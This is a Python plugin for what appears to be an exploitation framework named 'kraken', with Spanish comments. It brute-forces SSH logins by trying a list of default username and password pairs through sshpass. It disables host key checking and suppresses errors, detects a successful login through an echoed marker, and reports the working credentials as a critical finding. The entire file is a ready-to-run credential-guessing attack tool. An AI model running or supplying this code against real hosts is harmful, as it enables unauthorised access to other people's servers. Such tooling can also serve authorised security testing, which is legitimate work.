import subprocess
from typing import Optional
from kraken.core.exploiter import ExploitPlugin
from kraken.models.exploit import ExploitResult

class SSHBruteForcePlugin(ExploitPlugin):
    """Plugin para fuerza bruta SSH con credenciales por defecto."""

    def __init__(self):
        super().__init__(
            name="ssh_brute_force",
            description="Fuerza bruta SSH con credenciales por defecto",
            author="Sealclient",
            targets=["ssh", "openssh"],
            default_ports=[22]
        )

    def exploit(self, ip: str, port: int, service: str, **kwargs) -> Optional[ExploitResult]:
        settings = kwargs.get("settings")
        if not settings:
            return None

        for user, password in settings.DEFAULT_PASSWORDS:
            cmd = [
                "sshpass", "-p", password,
                "ssh", "-o", "ConnectTimeout=3",
                "-o", "StrictHostKeyChecking=no",
                "-o", "LogLevel=ERROR",
                f"{user}@{ip}", "-p", str(port),
                "echo", "KRAKEN_SUCCESS"
            ]

            try:
                result = subprocess.run(
                    cmd,
                    timeout=settings.EXPLOIT_TIMEOUT,
                    capture_output=True,
                    text=True
                )

                if result.returncode == 0 and "KRAKEN_SUCCESS" in result.stdout:
                    return ExploitResult(
                        ip=ip,
                        port=port,
                        service=service,
                        plugin=self.name,
                        vulnerability=f"SSH Credenciales por defecto: {user}/{password}",
                        cve=None,
                        cvss=9.8,
                        success=True,
                        output=f"Acceso exitoso con {user}/{password}"
                    )

            except subprocess.TimeoutExpired:
                pass
            except Exception as e:
                return ExploitResult(
                    ip=ip,
                    port=port,
                    service=service,
                    plugin=self.name,
                    vulnerability=f"Error en SSH: {str(e)}",
                    success=False,
                    output=str(e)
                )

        return None
